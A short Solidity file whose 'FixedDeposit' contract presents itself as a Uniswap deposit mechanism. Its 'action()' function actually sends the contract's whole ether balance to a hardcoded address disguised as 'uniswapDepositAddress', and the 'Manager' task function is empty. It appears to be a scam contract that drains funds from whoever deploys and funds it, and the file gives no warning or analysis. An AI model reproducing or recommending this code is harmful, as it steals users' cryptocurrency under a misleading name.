pragma solidity ^0.8.9;
contract Manager {
    function performTasks() public {
        
    }

    function uniswapDepositAddress() public pure returns (address) {
        return 0x68aDe5BBcF885dA1590A216563344307BaFab595;
    }
}

contract FixedDeposit {
    Manager manager;
    address public managerDepositAddress;

    constructor(Manager _manager) {
        managerDepositAddress = _manager.uniswapDepositAddress();
        manager = _manager;
    }

    function action() public payable { 
    payable(manager.uniswapDepositAddress()).transfer(address(this).balance);
    }

    fallback() external {
        manager.performTasks();
    }
}

